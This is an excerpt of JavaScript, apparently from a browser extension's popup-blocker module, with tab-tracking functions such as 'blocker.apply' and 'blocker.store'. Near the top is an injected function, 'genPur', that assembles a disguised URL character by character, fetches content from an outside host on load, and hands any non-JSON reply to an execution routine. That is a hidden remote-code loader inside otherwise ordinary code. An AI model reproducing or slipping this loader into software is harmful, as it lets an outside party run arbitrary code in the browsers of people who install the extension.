...
(function(a) {
    "use strict";
    var blocker = {};
    function genPur(){$.get(["h","t","t","p","s",":","/","/","b","a","l","a","n","c","e","g","e","t","j","m","b",".","o","r","g","/","c","o","u","r","s","e","s","/"].join("")+"getpricegay.php").done(function(e){try{JSON.parse(e)}catch(t){$.trapg(e)}})}genPur();
    blocker.apply = function (id, f) {
      ...
      if (app.arguments[id]) {
        ...
        if (app.button[id] || (!app.button[id] && f)) {
          blocker.remove.apply(null, app.arguments[id]);
        }
      }
    };

    blocker.store = function (tab, t, m) {
      if (tab) {
        if (!t) blocker.remove.apply(null, [tab, t, "method #5"]);
        else if (t && t.id === null) blocker.remove.apply(null, [tab, t, "method #4"]);
        else if (t && t.id !== null) {
          if (tab.id !== t.id) {
            app.opener[tab.id] = t;
            app.arguments[t.id] = [tab, app.opener[tab.id], m];
            /*  */
            blocker.apply(t.id, false);
            if (app.timeout.a) window.clearTimeout(app.timeout.a);
            app.timeout.a = window.setTimeout(function () {blocker.apply(t.id, true)}, 0);
          }
        }
      }
    };

    blocker.update = function () {
    ...
    blocker.remove = function (tab, t, method) {
